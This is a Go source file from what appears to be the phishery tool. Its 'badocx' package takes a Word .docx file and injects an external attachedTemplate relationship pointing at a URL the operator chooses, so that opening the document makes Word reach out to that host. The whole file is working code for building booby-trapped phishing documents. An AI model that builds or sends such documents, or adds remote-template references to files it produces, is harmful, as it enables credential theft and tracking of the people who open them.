package badocx

import (
	"archive/zip"
	"errors"
	"io/ioutil"
	"strings"

	"github.com/ryhanson/phishery/archivex"
)

type Docx struct {
	zipReader	*zip.ReadCloser
	files	  	[]*zip.File
	newFiles	map[string][]byte
}

func OpenDocx(path string) (*Docx, error) {
	reader, err := zip.OpenReader(path)
	if err != nil {
		return nil, err
	}

	wordDoc := Docx{
		zipReader: reader,
		files: reader.File,
		newFiles: map[string][]byte{},
	}

	for _, f := range wordDoc.files {
		contents, _ := wordDoc.retrieveFileContents(f.Name)
		wordDoc.newFiles[f.Name] = contents
	}

	return &wordDoc, nil
}

func (d *Docx) Close() error {
	return d.zipReader.Close()
}

func (d *Docx) WriteBadocx(filename string) error {
	newDoc := archivex.ZipFile{}

	newDoc.Create(filename)
	for p, b := range d.newFiles {
		newDoc.Add(p, b)
	}

	return newDoc.Close()
}

func (d *Docx) SetTemplate(url string) error {
	relsPath := "word/_rels/settings.xml.rels"
	settingsPath := "word/settings.xml"

	settingsRels, err := d.retrieveFileContents(relsPath)
	if err != nil {
		// Doesn't exist, create it
		d.newFiles[relsPath] = newSettingsRels(url)
	} else {
		// TODO: Check if template already exists and update
		d.newFiles[relsPath] = settingsRels
		return errors.New("Word document might already have a template URL")
	}

	settingsBytes, err := d.retrieveFileContents(settingsPath)
	if err != nil {
		return err
	}

	start := "/>"
	end := "<w"
	templateNode := start + `<w:attachedTemplate r:id="rId1337"/>` + end
	settingsXml := strings.Replace(string(settingsBytes), start + end, templateNode, 1)
	d.newFiles[settingsPath] = []byte(settingsXml)

	return nil
}

func (d *Docx) retrieveFileContents(filename string) ([]byte, error) {
	var file *zip.File
	for _, f := range d.files {
		if f.Name == filename {
			file = f
		}
	}

	if file == nil {
		return []byte{}, errors.New(filename + " file not found")
	}

	reader, err := file.Open()
	if err != nil {
		return []byte{}, err
	}

	return ioutil.ReadAll(reader)
}

func newSettingsRels(url string) []byte {
	newRels :=
		`<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
		<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
			<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
			Target="`+url+`"
			TargetMode="External"/>
		</Relationships>`

	return []byte(newRels)
}